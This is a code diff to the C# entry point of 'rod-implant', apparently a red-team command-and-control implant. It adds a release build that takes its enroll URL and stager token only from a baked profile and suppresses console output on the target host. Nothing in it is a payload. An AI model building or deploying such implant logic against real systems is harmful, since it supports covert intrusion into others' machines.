@@ -25,6 +25,15 @@ internal static class ImplantApp
             cts.Cancel();
         };
 
+        // The two builds of this binary (architecture.md Sec 5.1): DEBUG is
+        // the dev shape -- flags and the ROD_* environment drive the
+        // checked-in empty BakedProfile stub, and the run narrates to stderr.
+        // RELEASE is the fielded shape -- configuration is the bake and
+        // nothing else, arguments and environment are ignored entirely, and
+        // the console belongs to the target: narration is compiled out, with
+        // only the fatal one-liners (a refused enroll, a dead beacon) still
+        // printing, because an implant that dies silently is undebuggable.
+#if DEBUG
         Config config;
         try
         {
@@ -40,16 +49,13 @@ internal static class ImplantApp
             return ex.ExitCode;
         }
 
-        // The profile baked in at build time (the generated BakedProfile
-        // class) is authoritative for every operational key it carries: a
-        // fielded artifact cannot be re-pointed or re-credentialed through
-        // flags or the environment. An unbaked dev binary bakes nothing and
-        // keeps its full flag/env configuration.
+        // A bake, when one is present, overrides whatever the flags and env
+        // supplied -- the same authority the fielded shape runs under.
         BakedProfileSupport.ApplyBaked(config);
 
-        // The required-field check runs after the bake: a fielded artifact
-        // supplies its endpoint and credential there, and an unbaked run must
-        // present them via flags or env.
+        // The required-field check runs after the bake: a baked binary
+        // supplies its endpoint and credential there, and an unbaked dev run
+        // must present them via flags or env.
         try
         {
             config.Validate();
@@ -60,17 +66,25 @@ internal static class ImplantApp
             return ex.ExitCode;
         }
 
+        var log = Console.Error;
+#else
+        var config = new Config();
+        BakedProfileSupport.ApplyBaked(config);
+        if (config.EnrollURL.Length == 0 || config.StagerToken.Length == 0)
+        {
+            Console.Error.WriteLine(
+                "rod-implant: this release build carries no baked profile; field a pipeline-built artifact");
+            return 2;
+        }
+
+        var log = TextWriter.Null;
+#endif
+
         if (config.HasKillDate && DateTimeOffset.Now > config.KillDate)
         {
             Console.Error.WriteLine($"rod-implant: kill date {config.KillDate:O} has passed; refusing to run");
             return 1;
         }
-
-        // The narration log: stderr while developing, a null sink when quiet.
-        // Fatal paths below (refused enroll, dead beacon) print regardless --
-        // an implant that dies silently is undebuggable -- but the running
-        // implant's progress stays off the console of the host it runs on.
-        var log = config.Quiet ? TextWriter.Null : Console.Error;
 
         // The implant owns its private key; only the public half crosses enroll
         // (architecture.md Sec 9). ECDSA P-256: first-run keygen is effectively
